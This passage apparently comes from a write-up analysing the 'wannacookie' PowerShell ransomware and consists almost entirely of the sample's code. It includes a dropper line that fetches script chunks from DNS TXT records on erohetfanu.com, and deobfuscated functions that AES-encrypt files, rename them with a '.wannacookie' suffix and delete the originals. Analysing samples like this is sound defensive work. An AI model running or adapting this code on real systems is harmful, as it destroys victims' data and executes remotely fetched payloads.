class="p"&gt;};&lt;/span&gt; &lt;span class="nv"&gt;$f&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;77616E6E61636F6F6B69652E6D696E2E707331&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;$h&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$iin&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;..(&lt;/span&gt;&lt;span class="no"&gt;[convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ToInt32&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$f.erohetfanu.com&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;strings&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)-&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;&lt;span class="nv"&gt;$h&lt;/span&gt; &lt;span class="p"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Resolve-DnsName&lt;/span&gt; &lt;span class="n"&gt;-Server&lt;/span&gt; &lt;span class="n"&gt;erohetfanu&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;com&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$i.$f.erohetfanu.com&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;-Type&lt;/span&gt; &lt;span class="n"&gt;TXT&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="n"&gt;strings&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt; &lt;span class="p"&gt;$(&lt;/span&gt;&lt;span class="n"&gt;H2A&lt;/span&gt; &lt;span class="nv"&gt;$h&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Out-string&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;$functions = {function e_d_file($key, $File, $enc_it) {[byte[]]$key = $key;$Suffix = &amp;quot;`.wannacookie&amp;quot;;[System.Reflection.Assembly]::LoadWithPartialName(&amp;#39;System.Security.Cryptography&amp;#39;);[System.Int32]$KeySize = $key.Length*8;$AESP = New-Object &amp;#39;System.Security.Cryptography.AesManaged&amp;#39;;$AESP.Mode = [System.Security.Cryptography.CipherMode]::CBC;$AESP.BlockSize = 128;$AESP.KeySize = $KeySize;$AESP.Key = $key;$FileSR = New-Object System.IO.FileStream($File, [System.IO.FileMode]::Open);if ($enc_it) {$DestFile = $File + $Suffix} else {$DestF[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Wow, we get a lot of minified code. Let's make it a little bit more readable.
Here's the full source code of the malware. I just added carriage-returns
after every &lt;code&gt;}&lt;/code&gt;, &lt;code&gt;;&lt;/code&gt;, and indented the code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;$functions&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;e_d_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$File&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$enc_it&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="no"&gt;[byte[]]&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$Suffix&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;`.wannacookie&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="no"&gt;[System.Reflection.Assembly]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;LoadWithPartialName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;System.Security.Cryptography&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="no"&gt;[System.Int32]&lt;/span&gt;&lt;span class="nv"&gt;$KeySize&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;*&lt;/span&gt;&lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$AESP&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;System.Security.Cryptography.AesManaged&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Mode&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="no"&gt;[System.Security.Cryptography.CipherMode]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;CBC&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BlockSize&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;128&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;KeySize&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$KeySize&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Key&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nv"&gt;$FileSR&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FileStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$File&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;[System.IO.FileMode]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Open&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$enc_it&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$DestFile&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$File&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$Suffix&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$DestFile&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$File&lt;/span&gt; &lt;span class="o"&gt;-replace&lt;/span&gt; &lt;span class="nv"&gt;$Suffix&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;};&lt;/span&gt;
        &lt;span class="nv"&gt;$FileSW&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IO&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FileStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$DestFile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;[System.IO.FileMode]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Create&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$enc_it&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GenerateIV&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="nv"&gt;$FileSW&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[System.BitConverter]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IV&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;4&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nv"&gt;$FileSW&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IV&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IV&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nv"&gt;$Transform&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateEncryptor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="no"&gt;[Byte[]]&lt;/span&gt;&lt;span class="nv"&gt;$LenIV&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$FileSR&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Seek&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;[System.IO.SeekOrigin]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="k"&gt;Begin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Out-Null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$FileSR&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$LenIV&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Out-Null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="no"&gt;[Int]&lt;/span&gt;&lt;span class="nv"&gt;$LIV&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="no"&gt;[System.BitConverter]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ToInt32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$LenIV&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="no"&gt;[Byte[]]&lt;/span&gt;&lt;span class="nv"&gt;$IV&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="nv"&gt;$LIV&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$FileSR&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Seek&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;[System.IO.SeekOrigin]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="k"&gt;Begin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Out-Null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$FileSR&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$IV&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$LIV&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Out-Null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IV&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$IV&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="nv"&gt;$Transform&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateDecryptor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="p"&gt;};&lt;/span&gt;
        &lt;span class="nv"&gt;$CryptoS&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Security&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Cryptography&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CryptoStream&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$FileSW&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Transform&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;[System.Security.Cryptography.CryptoStreamMode]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="no"&gt;[Int]&lt;/span&gt;&lt;span class="nv"&gt;$Count&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="no"&gt;[Int]&lt;/span&gt;&lt;span class="nv"&gt;$BlockSzBts&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$AESP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BlockSize&lt;/span&gt; &lt;span class="p"&gt;/&lt;/span&gt; &lt;span class="n"&gt;8&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="no"&gt;[Byte[]]&lt;/span&gt;&lt;span class="nv"&gt;$Data&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;New-Object&lt;/span&gt; &lt;span class="n"&gt;Byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="nv"&gt;$BlockSzBts&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;Do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nv"&gt;$Count&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$FileSR&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$Data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$BlockSzBts&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nv"&gt;$CryptoS&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$Data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$Count&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;While&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$Count&lt;/span&gt; &lt;span class="o"&gt;-gt&lt;/span&gt; &lt;span class="n"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="nv"&gt;$CryptoS&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FlushFinalBlock&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="nv"&gt;$CryptoS&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="nv"&gt;$FileSR&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="nv"&gt;$FileSW&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
        &lt;span class="nb"&gt;Clear-variable&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nb"&gt;Remove-Item&lt;/span&gt; &lt;span class="nv"&gt;$File&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;H2B&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$HX&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$HX&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$HX&lt;/span&gt; &lt;span class="n"&gt;-split&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;(..)&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$_&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;ForEach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;$HX&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="no"&gt;[Convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ToInt32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;A2H&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="k"&gt;Param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$c&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$b&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToCharArray&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;Foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$element&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$c&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$c&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="no"&gt;[System.String]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;{0:X}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;[System.Convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;ToUInt32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$element&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$c&lt;/span&gt; &lt;span class="o"&gt;-replace&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39; &amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;H2A&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;Param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nv"&gt;$outa&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$a&lt;/span&gt; &lt;span class="n"&gt;-split&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;(..)&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$_&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;forEach&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="no"&gt;[char]&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;[convert]&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;toint16&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="k"&gt;forEach&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$outa&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$outa&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$outa&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="n"&gt;B2H&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$DEC&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
